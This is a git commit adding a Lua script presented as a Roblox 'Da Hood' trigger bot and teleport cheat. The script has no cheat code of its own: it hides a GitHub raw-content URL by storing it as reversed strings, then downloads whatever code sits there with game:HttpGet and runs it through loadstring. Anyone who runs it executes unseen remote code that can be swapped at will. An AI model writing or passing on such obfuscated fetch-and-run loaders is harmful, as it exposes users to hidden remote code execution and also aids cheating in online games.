ee7216ab0279e08792e5fd934c54eae7e540c881
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 17:10:32 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Da Hood Trigger Bot Teleports  More.lua
@@ -0,0 +1,11 @@
+local Hi = 'ecruoSxoByknaS/niam/xoB-yknaS/33'
+local Hello = '3lewx/moc.tnetnocresubuhtig.war//:sptth'
+loadstring(
+    game:HttpGet(
+        (
+            Hi..Hello
+            )
+        :reverse(
+        )
+    )
+){}
